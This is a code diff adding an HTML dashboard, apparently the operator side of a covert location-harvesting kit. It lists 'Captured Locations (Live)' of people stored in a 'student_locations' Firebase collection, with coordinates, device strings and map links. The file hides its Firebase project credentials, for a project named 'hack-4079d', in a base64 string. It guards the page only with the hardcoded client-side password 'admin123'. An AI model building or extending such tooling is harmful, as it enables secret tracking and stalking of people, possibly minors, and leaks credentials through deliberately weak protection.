@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Firebase Admin Panel</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; background: #e9ecef; }
+        .container { max-width: 1000px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        h2 { color: #333; border-bottom: 2px solid #ff4444; padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: center; }
+        th { background-color: #333; color: white; }
+        tr:nth-child(even) { background-color: #f8f9fa; }
+        .btn { background: #007bff; color: white; padding: 8px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block; cursor: pointer; border: none; font-size: 14px; }
+        .btn:hover { background: #0056b3; }
+        .btn-danger { background: #dc3545; margin-left: 5px; }
+        .btn-danger:hover { background: #c82333; }
+        #loading { text-align: center; padding: 20px; font-weight: bold; color: #666; }
+    </style>
+</head>
+<body>
+    <div id="app" style="display: none;">
+        <div class="container">
+            <h2>
+                <span>📍 Captured Locations (Live)</span>
+                <span id="count" style="font-size: 16px; color: #666;">Total: 0</span>
+            </h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Time Captured</th>
+                        <th>Device/Browser</th>
+                        <th>Latitude</th>
+                        <th>Longitude</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="table-body">
+                    <tr><td colspan="5" id="loading">Loading data from Firebase...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script type="module">
+        // Simple client-side protection
+        const pass = prompt("Enter Admin Password:");
+        if (pass !== "admin123") {
+            document.body.innerHTML = "<h2 style='text-align:center; color:red; margin-top:50px;'>Access Denied</h2>";
+            throw new Error("Wrong password");
+        }
+        document.getElementById('app').style.display = 'block';
+
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, query, orderBy, onSnapshot, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // Obfuscated config
+        const _fc = "eyJhcGlLZXkiOiJBSXphU3lESFhDal9Uay1oc1pDbmVuZldrQlZTUlBWVW1vQVlRbWsiLCJhdXRoRG9tYWluIjoiaGFjay00MDc5ZC5maXJlYmFzZWFwcC5jb20iLCJwcm9qZWN0SWQiOiJoYWNrLTQwNzlkIiwic3RvcmFnZUJ1Y2tldCI6ImhhY2stNDA3OWQuZmlyZWJhc2VzdG9yYWdlLmFwcCIsIm1lc3NhZ2luZ1NlbmRlcklkIjoiNTg1MzU5NDgyNDk0IiwiYXBwSWQiOiIxOjU4NTM1OTQ4MjQ5NDp3ZWI6ZjM4OWRkNWVlNmY2MWZmMWYzMDIyZiIsIm1lYXN1cmVtZW50SWQiOiJHLUxIR0tYTEZWWlcifQ==";
+        const app = initializeApp(JSON.parse(atob(_fc)));
+        const db = getFirestore(app);
+
+        const tbody = document.getElementById('table-body');
+        const countEl = document.getElementById('count');
+
+        // Listen for live updates
+        const q = query(collection(db, "student_locations"), orderBy("timestamp", "desc"));
+        
+        onSnapshot(q, (snapshot) => {
+            if (snapshot.empty) {
+                tbody.innerHTML = '<tr><td colspan="5">No data received yet.</td></tr>';
+                countEl.innerText = "Total: 0";
+                return;
+            }
+
+            countEl.innerText = "Total: " + snapshot.size;
+            let html = '';
+            
+            snapshot.forEach((documentSnapshot) => {
+                const data = documentSnapshot.data();
+                const id = documentSnapshot.id;
+                
+                // Format time safely
+                let timeStr = "Unknown time";
+                if (data.timestamp && typeof data.timestamp.toDate === 'function') {
+                    timeStr = data.timestamp.toDate().toLocaleString();
+                }
+                
+                // Shorten user agent
+                let ua = (data.userAgent || 'Unknown').substring(0, 30) + "...";
+
+                html += `
+                    <tr>
+                        <td>${timeStr}</td>
+                        <td title="${data.userAgent}">${ua}</td>
+                        <td>${data.lat}</td>
+                        <td>${data.lng}</td>
+                        <td>
+                            <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" class="btn">Map</a>
+                            <button class="btn btn-danger delete-btn" data-id="${id}">Delete</button>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            tbody.innerHTML = html;
+
+            // Attach delete listeners
+            document.querySelectorAll('.delete-btn').forEach(btn => {
+                btn.addEventListener('click', async (e) => {
+                    const docId = e.target.getAttribute('data-id');
+                    if(confirm("Are you sure you want to delete this record from Firebase?")) {
+                        try {
+                            await deleteDoc(doc(db, "student_locations", docId));
+                        } catch(err) {
+                            alert("Error deleting: " + err.message);
+                        }
+                    }
+                });
+            });
+        }, (error) => {
+            console.error("Firebase Error:", error);
+            tbody.innerHTML = `<tr><td colspan="5" style="color:red;">Error loading data: ${error.message}</td></tr>`;
+        });
+    </script>
+</body>
+</html>
